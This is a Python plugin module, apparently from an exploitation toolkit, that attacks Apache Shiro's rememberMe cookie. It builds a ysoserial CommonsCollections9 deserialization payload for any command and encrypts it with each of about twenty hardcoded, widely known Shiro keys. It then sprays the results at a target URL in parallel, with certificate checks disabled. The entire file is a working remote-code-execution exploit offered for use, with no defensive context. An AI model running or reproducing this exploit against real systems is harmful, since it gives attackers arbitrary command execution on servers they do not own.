#!/usr/bin/env python
# _*_ coding:utf-8 _*_

import base64
import os
import requests
import subprocess
import threadpool
import uuid

from Crypto.Cipher import AES

from module.main import Idea


requests.packages.urllib3.disable_warnings()
JAR_FILE = 'module/ysoserial.jar'

@Idea.plugin_register('Class10:CommonsCollections9')
class CommonsCollections9(object):
    def process(self, url, command, thre):
        self.poc(url, command, thre)

    def generator(self, key, target, command, file_path=JAR_FILE):

        if not os.path.exists(file_path):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(
            ['java', '-jar', file_path, 'CommonsCollections9', command],
            stdout=subprocess.PIPE
        )
        bs = AES.block_size
        pad = lambda s: s + (
                    (bs - len(s) % bs) * chr(bs - len(s) % bs)).encode()
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        # 受key影响的encryptor
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        # 受popen影响的file_body
        file_body = pad(popen.stdout.read())
        payload = base64.b64encode(iv + encryptor.encrypt(file_body))
        header = {
            'User-agent': ('Mozilla/5.0 (Windows NT 6.2; WOW64; '
                           'rv:22.0) Gecko/20100101 Firefox/22.0;'
                           )
        }
        try:
            resp = requests.get(
                target, headers=header,
                cookies={'rememberMe': payload.decode() + "="},
                verify=False, timeout=20)

            if resp.status_code == 200:
                print(
                    "[+]CommonsCollections9模块key: {} 已成功发送! 状态码:{}".format(
                        str(key), str(resp.status_code)
                    )
                )
            else:
                print(
                    "[-]CommonsCollections9模块key: {} 发送异常! 状态码:{}".format(
                        str(key), str(resp.status_code)
                    )
                )
        except Exception:
            print("[-]请求发送异常")
        return False

    def multithreading(self, funcname, url, command, pools):
        args_list = [
            (('kPH+bIxk5D2deZiIxcaaaA==', url, command), None),
            (('wGiHplamyXlVB11UXWol8g==', url, command), None),
            (('2AvVhdsgUs0FSA3SDFAdag==', url, command), None),
            (('4AvVhmFLUs0KTA3Kprsdag==', url, command), None),
            (('3AvVhmFLUs0KTA3Kprsdag==', url, command), None),
            (('Z3VucwAAAAAAAAAAAAAAAA==', url, command), None),
            (('U3ByaW5nQmxhZGUAAAAAAA==', url, command), None),
            (('wGiHplamyXlVB11UXWol8g==', url, command), None),
            (('6ZmI6I2j5Y+R5aSn5ZOlAA==', url, command), None),
            (('fCq+/xW488hMTCD+cmJ3aQ==', url, command), None),
            (('1QWLxg+NYmxraMoxAXu/Iw==', url, command), None),
            (('ZUdsaGJuSmxibVI2ZHc9PQ==', url, command), None),
            (('L7RioUULEFhRyxM7a2R/Yg==', url, command), None),
            (('r0e3c16IdVkouZgk1TKVMg==', url, command), None),
            (('5aaC5qKm5oqA5pyvAAAAAA==', url, command), None),
            (('bWluZS1hc3NldC1rZXk6QQ==', url, command), None),
            (('a2VlcE9uR29pbmdBbmRGaQ==', url, command), None),
            (('WcfHGU25gNnTxTlmJMeSpw==', url, command), None),
            (('bWljcm9zAAAAAAAAAAAAAA==', url, command), None),
            (('MTIzNDU2Nzg5MGFiY2RlZg==', url, command), None),
            (('5AvVhmFLUs0KTA3Kprsdag==', url, command), None)
        ]
        pool = threadpool.ThreadPool(pools)
        requests_ = threadpool.makeRequests(funcname, args_list)
        [pool.putRequest(req) for req in requests_]
        pool.wait()

    def poc(self, url, command, thre):
        self.multithreading(self.generator, url, command, thre)
        return False
